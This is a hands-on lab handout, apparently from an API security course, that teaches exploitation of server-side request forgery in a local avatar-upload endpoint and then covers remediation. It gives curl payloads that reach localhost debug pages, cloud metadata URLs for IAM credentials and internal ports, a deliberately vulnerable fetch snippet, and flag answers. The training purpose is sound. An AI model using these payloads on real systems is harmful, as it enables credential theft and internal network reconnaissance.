# Lab 09: Server-Side Request Forgery (SSRF)

## Objective

Exploit a Server-Side Request Forgery (SSRF) vulnerability in the avatar upload endpoint to access internal services, extract secrets, and probe the internal network.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Medium-Hard |
| **Estimated Time** | 60 minutes |
| **Prerequisites** | Labs 01–08 completed, understanding of HTTP, Python 3 with `requests` |
| **OWASP API Category** | API7:2023 – Server Side Request Forgery |

---

## Background

### What Is SSRF?

Server-Side Request Forgery (SSRF) occurs when an application fetches a remote resource using a **user-supplied URL without proper validation**. Instead of providing a legitimate URL (e.g., an avatar image), the attacker provides a URL pointing to:

- **Internal services** (localhost, 127.0.0.1)
- **Cloud metadata endpoints** (169.254.169.254)
- **Internal network hosts** (10.x.x.x, 192.168.x.x)
- **Other protocols** (file://, gopher://, dict://)

### Why Is It Dangerous?

```
┌─────────────┐     ┌──────────────────┐     ┌───────────────────────┐
│  Attacker   │────▶│  Vulnerable API  │────▶│  Internal Service     │
│  (External) │     │  (SSRF Gateway)  │     │  (Not Exposed)        │
└─────────────┘     └──────────────────┘     └───────────────────────┘
                          │
                          ▼
                    ┌──────────────────┐
                    │  Cloud Metadata  │
                    │  (AWS/GCP/Azure) │
                    └──────────────────┘
```

| Target | What You Can Access |
|---|---|
| `http://localhost:<port>` | Internal APIs, debug endpoints, admin panels |
| `http://169.254.169.254` | AWS/GCP/Azure instance metadata (IAM credentials) |
| `http://10.0.0.x` | Internal microservices, databases |
| `file:///etc/passwd` | Local filesystem (if file:// protocol is allowed) |

### Real-World SSRF Attacks

- **2019 – Capital One Breach**: SSRF was used to access AWS metadata and steal credentials for 100M+ customer records.
- **2021 – Microsoft Exchange**: SSRF chained with other vulnerabilities for full server compromise.

### Vulnerable Code Pattern

```python
# VULNERABLE — no URL validation
@app.route('/api/v1/upload/avatar', methods=['POST'])
def upload_avatar():
    url = request.json.get('url')
    response = requests.get(url)       # Server fetches ANY URL
    return jsonify({"content": response.text})
```

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5000` |
| Vulnerable Endpoint | `POST /api/v1/upload/avatar` |
| Internal Debug Endpoint | `http://localhost:5000/api/v1/debug` |
| Auth Required | Yes (any valid JWT) |

---

## Tasks

### Task 1: Basic SSRF — Fetch Internal API Info

**Goal:** Use the avatar upload endpoint to make the server fetch its own internal pages.

**Steps:**

1. Login and get a JWT token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

2. Use the avatar upload endpoint normally (how it's supposed to work):

```bash
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "https://example.com/image.png"}'
```

3. Now provide a URL pointing to the server itself:

```bash
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://localhost:5000/"}'
```

4. Examine the response. The server fetched its own homepage and returned the content!

```bash
# Try the API root
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://localhost:5000/api/v1/"}'
```

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The <code>url</code> parameter accepts any URL. What happens if you point it at <code>http://localhost:5000</code> itself?
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
The server will fetch whatever URL you provide and return the response content. Use <code>http://localhost:5000/</code> to see what internal pages look like from the server's perspective.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
Send <code>{"url": "http://localhost:5000/"}</code> to the avatar endpoint. The response will contain the HTML/JSON of the API's own homepage.
</details>

---

### Task 2: Access Internal Debug Endpoint

**Goal:** Discover and access the internal debug endpoint that's not meant to be publicly accessible.

**Steps:**

1. Try to access the debug endpoint directly (it may be blocked):

```bash
curl -s http://localhost:5000/api/v1/debug \
  -H "Authorization: Bearer $TOKEN"
```

2. Now use SSRF to access it from the server's perspective:

```bash
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://localhost:5000/api/v1/debug"}'
```

3. The debug endpoint should expose sensitive configuration details including:
   - JWT secret key
   - Database connection string
   - Debug mode status
   - Internal configuration

4. Examine the response carefully. Extract the JWT secret and database URI.

> **🚩 FLAG 1:** What is the JWT secret key obtained via SSRF?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
Debug endpoints often expose application configuration. Try <code>/api/v1/debug</code>, <code>/debug</code>, <code>/_debug</code>, or <code>/api/v1/internal/config</code>.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
Use SSRF to hit <code>http://localhost:5000/api/v1/debug</code>. The response should contain a JSON object with keys like <code>jwt_secret</code>, <code>database_uri</code>, etc.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The JWT secret key is: <code>socialhack-secret-key</code>
</details>

---

### Task 3: Extract Database URI

**Goal:** Find the database connection string from the debug endpoint output.

**Steps:**

1. Parse the debug response from Task 2 for database-related fields.

2. Look for fields like:
   - `database_uri`
   - `db_connection`
   - `SQLALCHEMY_DATABASE_URI`

3. The database URI reveals the type of database and its location.

> **🚩 FLAG 2:** What is the database URI obtained via SSRF?

<details>
<summary>Hint 1</summary>
The debug output should contain a key like <code>database_uri</code> or <code>SQLALCHEMY_DATABASE_URI</code>.
</details>

<details>
<summary>Hint 2</summary>
For a SQLite database, the URI will look like <code>sqlite:///path/to/database.db</code>.
</details>

<details>
<summary>Hint 3</summary>
Look for <code>sqlite:///</code> followed by a file path in the debug endpoint response.
</details>

---

### Task 4: Attempt Cloud Metadata Access

**Goal:** Demonstrate how SSRF could be used to steal cloud credentials.

**Steps:**

1. Try to access the AWS metadata endpoint:

```bash
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

2. In a real cloud environment, this would return:
   - Instance ID
   - IAM role credentials
   - Security tokens
   - Network configuration

3. Try the GCP metadata endpoint:

```bash
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'
```

4. Since we're running locally (not in AWS/GCP), these will fail — but note the server still **attempts** the connection, which proves the vulnerability exists.

<details>
<summary>Hint 1</summary>
The metadata endpoints will fail in a lab environment but would succeed on actual cloud instances.
</details>

<details>
<summary>Hint 2</summary>
On AWS, <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> returns the IAM role name, and then you can get temporary credentials from that path.
</details>

<details>
<summary>Hint 3</summary>
The important finding is that the server makes the request at all. A properly secured application would block requests to RFC 1918 and link-local addresses.
</details>

---

### Task 5: Internal Network Port Scanning

**Goal:** Use SSRF to scan for open ports on the internal network.

**Steps:**

1. Scan common ports on localhost:

```bash
# Check if SSH is running on port 22
curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://127.0.0.1:22"}'

# Check for common services
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  echo "Port $port:"
  curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"url\": \"http://127.0.0.1:$port\"}" | head -c 100
  echo ""
done
```

2. Analyze the responses. Different response patterns indicate:
   - **Connection refused**: Port is closed
   - **Timeout**: Port is filtered/blocked
   - **Content returned**: Port is open with a service responding

> **🚩 FLAG 3:** What is the response when trying to access 127.0.0.1:22?

<details>
<summary>Hint 1</summary>
Different ports will give different error messages or content. SSH (port 22) will likely show a protocol banner or connection error that differs from a "connection refused" error.
</details>

<details>
<summary>Hint 2</summary>
If SSH is running, you might see an SSH banner like <code>SSH-2.0-OpenSSH_8.x</code> in the response. If not running, you'll see a connection error.
</details>

<details>
<summary>Hint 3</summary>
The response will either contain the SSH banner string or a connection error. Either way, the server attempted the connection — proving SSRF is exploitable for network reconnaissance.
</details>

---

### Task 6: Enumerate Internal Endpoints (Bonus)

**Goal:** Use SSRF to discover hidden API endpoints.

```bash
# Wordlist of common internal paths
for path in debug health status config env metrics prometheus internal admin swagger docs api-docs openapi.json; do
  echo "Testing /$path:"
  RESP=$(curl -s -X POST http://localhost:5000/api/v1/upload/avatar \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"url\": \"http://localhost:5000/$path\"}")
  echo "$RESP" | head -c 100
  echo ""
done
```

---

## Flags Summary

| Flag | Description | Value |
|---|---|---|
| FLAG 1 | JWT secret key via SSRF | `socialhack-secret-key` |
| FLAG 2 | Database URI via SSRF | `sqlite:///...` (path varies) |
| FLAG 3 | Response from 127.0.0.1:22 | SSH banner or connection error |

---

## Remediation

### 1. URL Allowlist

Only allow fetching from approved domains:

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['cdn.example.com', 'images.example.com']

def validate_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Protocol not allowed: {parsed.scheme}")
    return url
```

### 2. Block Internal IPs

```python
import ipaddress
import socket

BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Loopback
    ipaddress.ip_network('10.0.0.0/8'),        # Private
    ipaddress.ip_network('172.16.0.0/12'),     # Private
    ipaddress.ip_network('192.168.0.0/16'),    # Private
    ipaddress.ip_network('169.254.0.0/16'),    # Link-local (metadata)
    ipaddress.ip_network('0.0.0.0/8'),         # Current network
]

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # Resolve hostname to IP
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    except (socket.gaierror, ValueError):
        return False

    # Check against blocked ranges
    for blocked in BLOCKED_RANGES:
        if ip in blocked:
            return False
    return True
```

### 3. Use a Dedicated Proxy

Route all outbound requests through a proxy that enforces security policies:

```python
# Use a dedicated HTTP proxy for outbound requests
proxies = {
    'http': 'http://outbound-proxy:3128',
    'https': 'http://outbound-proxy:3128',
}
response = requests.get(url, proxies=proxies, timeout=5)
```

### 4. Disable Unnecessary Protocols

```python
# Only allow http and https
if not url.startswith(('http://', 'https://')):
    abort(400, "Only HTTP/HTTPS URLs are allowed")
```

### 5. Network Segmentation

- Place the API server in a DMZ
- Use firewall rules to restrict outbound connections
- Block access to metadata endpoints at the network level
- Use AWS IMDSv2 (requires token-based access to metadata)

### 6. Remove Debug Endpoints in Production

```python
if app.config['ENV'] != 'development':
    # Don't register debug routes
    pass
else:
    @app.route('/api/v1/debug')
    def debug():
        ...
```

---

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [Capital One Breach Analysis](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
